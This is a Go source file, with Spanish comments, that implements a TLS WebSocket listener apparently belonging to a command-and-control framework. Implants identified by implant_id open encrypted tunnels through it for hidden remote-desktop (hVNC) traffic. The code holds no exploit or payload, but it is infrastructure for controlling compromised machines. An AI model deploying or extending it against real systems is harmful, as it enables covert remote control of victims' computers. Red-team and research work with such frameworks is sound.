package listeners

import (
	"context"
	"crypto/tls"
	"fmt"
	"log/slog"
	"net/http"
	"sync"
	"time"

	"github.com/coder/websocket"
	"github.com/google/uuid"
	"github.com/uLl0a/lavianc2/internal/beacons"
	"github.com/uLl0a/lavianc2/internal/crypto"
	"github.com/uLl0a/lavianc2/internal/protocol"
	"github.com/uLl0a/lavianc2/internal/storage"
)

// WSListener acepta túneles WebSocket persistentes (para hVNC y otras
// características de latencia nula). Reutiliza el cifrado de sesión del
// SessionCryptoStore y el envelope binario del protocolo.
//
// El túnel es bidireccional: el cliente envía envelopes cifrados y el
// server responde envelopes cifrados, sin el polling del transporte HTTPS.
type WSListener struct {
	ID       uuid.UUID
	Name     string
	BindAddr string

	store    *storage.Store
	log      *slog.Logger
	router   *protocol.Router
	crypto   *crypto.SessionCryptoStore
	manager  *beacons.Manager
	certFile string
	keyFile  string

	mu      sync.Mutex
	server  *http.Server
	closing bool
}

// WSListenerConfig agrupa las dependencias del listener WS.
type WSListenerConfig struct {
	ID       uuid.UUID
	Name     string
	BindAddr string
	CertFile string
	KeyFile  string
	Store    *storage.Store
	Log      *slog.Logger
	Router   *protocol.Router
	Manager  *beacons.Manager
}

// NewWSListener crea el listener de túneles. crypto se comparte con el
// listener HTTPS para reutilizar las claves de sesión ya derivadas.
func NewWSListener(cfg WSListenerConfig) (*WSListener, error) {
	if cfg.CertFile == "" || cfg.KeyFile == "" {
		return nil, fmt.Errorf("listener ws: certFile y keyFile requeridos")
	}
	if cfg.Router == nil {
		return nil, fmt.Errorf("listener ws: router requerido")
	}
	l := &WSListener{
		ID:       cfg.ID,
		Name:     cfg.Name,
		BindAddr: cfg.BindAddr,
		store:    cfg.Store,
		log:      cfg.Log,
		router:   cfg.Router,
		manager:  cfg.Manager,
		certFile: cfg.CertFile,
		keyFile:  cfg.KeyFile,
	}

	l.router.MustRegister(protocol.MsgTunnel, func(ctx context.Context, env *protocol.Envelope) (*protocol.Envelope, error) {
		// Eco: devolvemos el mismo payload recibido. El cliente puede
		// distinguir esto de un error, y sabemos que el frame llegó.
		return protocol.NewEnvelope(protocol.MsgTunnel, env.Payload), nil
	})

	return l, nil
}

// Start arranca el servidor HTTP con endpoint de upgrade a WebSocket.
// Bloquea hasta que ctx se cancela o falla el listener.
func (l *WSListener) Start(ctx context.Context) error {
	mux := http.NewServeMux()
	mux.HandleFunc("/ws/tunnel", l.handleTunnel)

	l.server = &http.Server{
		Addr:         l.BindAddr,
		Handler:      mux,
		ReadTimeout:  60 * time.Second,
		WriteTimeout: 60 * time.Second,
		TLSConfig: &tls.Config{
			MinVersion: tls.VersionTLS13,
		},
	}

	errCh := make(chan error, 1)
	go func() {
		l.log.Info("WS listener activo", "addr", l.BindAddr, "path", "/ws/tunnel")
		if err := l.server.ListenAndServeTLS(l.certFile, l.keyFile); err != nil && err != http.ErrServerClosed {
			errCh <- err
		}
	}()

	select {
	case <-ctx.Done():
		return l.Stop(context.Background())
	case err := <-errCh:
		return err
	}
}

// Stop detiene el listener de forma graceful.
func (l *WSListener) Stop(ctx context.Context) error {
	l.mu.Lock()
	if l.closing {
		l.mu.Unlock()
		return nil
	}
	l.closing = true
	l.mu.Unlock()
	if l.server == nil {
		return nil
	}
	l.log.Info("deteniendo WS listener")
	return l.server.Shutdown(ctx)
}

// handleTunnel realiza el upgrade a WebSocket y bombea envelopes.
func (l *WSListener) handleTunnel(w http.ResponseWriter, r *http.Request) {
	// El beacon debe haber negociado ya una sesión vía HTTPS; aquí solo
	// abrimos el túnel. El implant_id viaja en query (?implant_id=).
	implantIDStr := r.URL.Query().Get("implant_id")
	implantID, err := uuid.Parse(implantIDStr)
	if err != nil {
		http.Error(w, "implant_id inválido", http.StatusBadRequest)
		return
	}

	// Solo beacons short-haul pueden abrir túnel (regla dura). El manager
	// resuelve el beacon a partir del implant_id.
	if l.manager != nil {
		if err := l.manager.OpenTunnelForImplant(implantID); err != nil {
			l.log.Warn("ws: túnel rechazado", "implant", implantID, "err", err)
			http.Error(w, "túnel no permitido para este beacon", http.StatusForbidden)
			return
		}
		defer l.manager.CloseTunnelForImplant(implantID)
	}

	c, err := websocket.Accept(w, r, &websocket.AcceptOptions{
		Subprotocols: []string{"rtc2.tunnel"},
	})
	if err != nil {
		l.log.Warn("ws: accept", "err", err)
		return
	}
	defer c.Close(websocket.StatusNormalClosure, "cerrando túnel")

	l.log.Info("ws: túnel abierto", "implant", implantID)
	ctx, cancel := context.WithCancel(r.Context())
	defer cancel()

	// Bombeo bidireccional: leer envelopes del beacon, despachar, responder.
	for {
		_, data, err := c.Read(ctx)
		if err != nil {
			l.log.Debug("ws: read fin", "implant", implantID, "err", err)
			return
		}
		respEnv, err := l.router.Dispatch(ctx, &protocol.Envelope{
			Type:    protocol.MsgTunnel,
			Payload: data,
		})
		if err != nil {
			l.log.Warn("ws: dispatch", "err", err)
			continue
		}
		respBytes, err := respEnv.Marshal()
		if err != nil {
			continue
		}
		if err := c.Write(ctx, websocket.MessageBinary, respBytes); err != nil {
			l.log.Debug("ws: write fin", "implant", implantID, "err", err)
			return
		}
	}
}

// Metadata devuelve la información identificativa del listener.
func (l *WSListener) Metadata() ListenerMetadata {
	return ListenerMetadata{
		ID:   l.ID,
		Name: l.Name,
		Type: "websocket",
	}
}
